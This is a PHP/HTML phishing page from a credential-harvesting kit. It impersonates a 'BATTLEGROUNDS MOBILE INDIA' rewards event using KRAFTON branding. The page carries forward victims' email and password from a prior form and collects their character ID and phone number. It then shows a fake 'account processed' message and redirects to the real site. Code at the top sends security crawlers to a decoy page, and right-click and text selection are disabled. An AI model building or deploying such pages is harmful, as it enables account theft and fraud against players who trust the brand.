
<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="BATTLEGROUNDS MOBILE INDIA: Winged Cavalry Rewards">
<meta name="description" content="Collect your special rewards at the Winged Cavalry Rewards event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:description" content="Collect your special rewards at the Winged Cavalry Rewards event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="BATTLEGROUNDS MOBILE INDIA: Winged Cavalry Rewards">
<meta property="og:type" content="website">
<meta name="copyright"content="BATTLEGROUNDS MOBILE INDIA">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://www.battlegroundsmobileindia.com/common/img/thum.jpg">
<title>BATTLEGROUNDS MOBILE INDIA: RP M15 Rewards</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://www.battlegroundsmobileindia.com/common/img/favicon.ico">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://i.postimg.cc/ZRRLhsDK/bgmi-logo.jpg">
<div class="navbar-right">
<img class="navbar-shop" src="img/nav_shop.svg">
<img class="navbar-language" src="img/nav_language.svg">
<img class="navbar-language" src="img/nav_menu.svg">
<div class="navbar-download"><img src="img/nav_download.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="event-title">RP M15: RAZZLE DAZZLE</div> <!--- event-title --->
<div class="event-subtitle"><span>Choose and collect your rewards in this event</span></div> <!--- event-subtitle --->
<div class="event-notification-wrapper">
<div class="event-notification-content"><i class="zmdi zmdi-chevron-right"></i> Rewards will be available until <div class="event-notification-content-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span></div></div> <!--- event-notification-content --->
</div> <!--- event-notification-wrapper --->
<div class="box">
<center>
<div class="tab_rewards" id="season">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/5.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/6.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/7.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/7.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/8.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/8.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/9.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/9.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/10.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/10.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/11.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/11.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/12.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/12.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">28</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/tRcvfPDp/material.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="28" src="https://i.postimg.cc/tRcvfPDp/material.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">50</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/7LDk0NxC/material-xsuit-silver.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="50" src="https://i.postimg.cc/7LDk0NxC/material-xsuit-silver.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">25</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/gkTjVQ5x/material-xsuit-gold.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="25" src="https://i.postimg.cc/gkTjVQ5x/material-xsuit-gold.png">Collect</button>
</div>
</div>
</div> <!--- tab-rewards --->
</center>
</div> <!--- box --->
<div class="footer">
<img class="footer-copyright-icon" src="https://www.battlegroundsmobileindia.com/common/img/common/footerlg.png">
<div class="footer-txt-copyright">ⓒ 2022 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct | Official Community Policy</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup account_verification">
<div class="popup-box-wrapper popup-box-verification">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Complete your account detail</div> <!--- popup-box-alert --->
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" id="password" value="<?php echo $password;?>" readonly>
<input type="number" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required>
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required>
<select name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" id="login" value="<?php echo $login;?>" readonly>
</div> <!--- popup-box-bg --->
<div class="popup-box-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify my Account</button>
</div> <!--- popup-box-form-footer --->
</form> <!--- form --->
</div> <!--- popup-box-wrapper popup-box-verification --->
</div> <!--- popup account_verification --->

<div class="popup check_verification" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
</div> <!--- popup-box-alert --->
<br>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup check_verification --->

<div class="popup processing_account" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Processing Account</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">
Thanks for joining this event
<br>
<br>
Your account has been successfully processed
<br>
Please wait up to 24 hours
</div> <!--- popup-box-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(img/pop-collect.png) no-repeat center; background-size: 100% 100%;margin-right: 0; float: none;" onclick="location.href='https://www.battlegroundsmobileindia.com/';">Logout</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup processing_account --->

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>

</body>
</html>